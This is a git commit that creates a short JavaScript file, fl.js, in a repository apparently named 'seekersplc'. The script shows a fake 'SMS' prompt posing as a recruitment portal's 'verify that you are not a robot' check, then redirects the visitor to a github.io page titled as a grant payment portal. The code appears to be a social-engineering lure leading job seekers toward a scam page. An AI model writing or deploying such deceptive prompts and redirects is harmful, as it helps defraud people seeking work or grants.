6607a0e2ecdade292cad4fdeeff28cc12ec31026
seekersplc <bigmell41@gmail.com>
2025-05-26 01:49:18 +0100

    Create fl.js

---
+++ fl.js
@@ -0,0 +1,5 @@
+var password = 'MOA'
+password=prompt('SMS :Welcome to our recruitment portal. Click OK to verify that you are not a robot ','MOA');
+if (password != 'MOA') {
+location.href='https://seekersplc.github.io/MOA.Grant.Payment.Portal.lr';
+}
